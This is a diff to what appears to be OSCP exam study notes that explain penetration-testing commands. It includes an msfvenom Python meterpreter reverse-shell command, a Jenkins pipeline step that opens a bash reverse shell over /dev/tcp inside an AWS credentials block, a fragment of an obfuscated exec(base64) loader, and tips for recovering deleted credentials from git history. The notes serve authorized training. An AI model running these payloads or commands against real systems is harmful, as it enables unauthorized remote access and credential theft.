@@ -138,7 +138,7 @@ exec(__import__('zlib').decompress(__import__('base64').b64decode(
 ## `msfvenom -f raw -p python/meterpreter/reverse_tcp`
 
 ```bash
-msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4488
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$BoxIP LPORT=4488
 ```
 
 | Part | What it does |
@@ -192,7 +192,7 @@ route add 172.30.0.0 255.255.0.0 <session_id>
 withAWS(region: 'us-east-1', credentials: 'aws_key') {
   script {
     if (isUnix()) {
-      sh 'bash -c "bash -i >& /dev/tcp/<ip>/4242 0>&1" &'
+      sh 'bash -c "bash -i >& /dev/tcp/$BoxIP/4242 0>&1" &'
     }
   }
 }
@@ -211,7 +211,7 @@ withAWS(region: 'us-east-1', credentials: 'aws_key') {
 
 ---
 
-## `git show <commit_hash>` — reading diff output for removed secrets
+## `git show $AdminHash` — reading diff output for removed secrets
 
 ```bash
 git show 643827653669...
@@ -219,7 +219,7 @@ git show 643827653669...
 
 | Part | What it does |
 |------|-------------|
-| `git show <hash>` | Displays the commit metadata (author, date, message) followed by the unified diff — lines prefixed with `-` were removed, `+` were added |
+| `git show $AdminHash` | Displays the commit metadata (author, date, message) followed by the unified diff — lines prefixed with `-` were removed, `+` were added |
 | Lines starting with `-` | Content that was present BEFORE this commit — these are the deleted lines. A removed hardcoded credential shows here as a `-` line |
 | `Authorization: Basic <base64>` | HTTP Basic auth header format. The base64 value is `username:password` encoded with `echo -n "user:pass" \| base64`. Decode with `echo "<value>" \| base64 --decode` |
 | `git log` first | Always `git log` before `git show` to identify suspicious commit messages: "Fix issue" / "Remove creds" / "Hotfix" / "Clean up" are red flags worth inspecting |
@@ -232,3 +232,14 @@ git show 643827653669...
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
